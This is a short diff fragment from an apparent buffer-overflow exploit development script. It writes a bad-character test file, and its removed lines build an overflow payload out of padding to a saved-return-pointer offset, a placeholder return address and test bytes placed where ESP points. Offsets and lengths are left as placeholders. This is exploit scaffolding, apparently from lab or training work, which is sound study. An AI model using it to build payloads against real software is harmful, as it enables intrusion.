@@ -27,16 +27,6 @@ for i in range(0x00, 0xFF+1): # range(0x00, 0xFF) only returns up to 0xFE
 with open("badchar_test.bin", "wb") as f:
 	f.write(badchar_test)
 
-buf_totlen=TOTAL LENGTH
-offset_srp = OFFSET
-
-buf = ""
-buf += "A"*(offset_srp - len(buf)) #padding
-buf += "ZZZZ"
-buf += badchar_test #ESP points here
-buf += "C"*(buf_totlen - len(buf)) #trailing padding
-buf += "\n"
-
 #build a message
 
 buf_totlen= TOTAL LENGTH
